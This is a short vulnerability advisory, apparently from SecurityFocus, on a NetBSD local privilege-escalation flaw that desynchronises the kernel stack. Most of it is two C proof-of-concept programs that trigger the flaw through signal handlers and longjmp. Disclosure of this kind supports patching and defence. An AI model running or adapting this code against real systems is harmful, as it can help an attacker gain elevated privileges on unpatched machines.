source: http://www.securityfocus.com/bid/36430/info

NetBSD is prone to a local privilege-escalation vulnerability.

A local attacker may exploit this issue to cause the kernel stack to become desynchronized. This may allow the attacker to gain elevated privileges or may aid in further attacks. 

/* ... */
int main(int argc, char **argv)
{
  jmp_buf env;

  void handlesig(int n) {
        longjmp(env, 1);

  }
  signal(SIGSEGV, handlesig);

  if (setjmp(env) == 0) {
        ( (void(*)(void)) NULL) ();
  }

  return 0;
}

/* ... */
int main(int argc, char **argv)
{
       char baguette;
       signal(SIGABRT, (void (*)(int))&baguette);
       abort();
}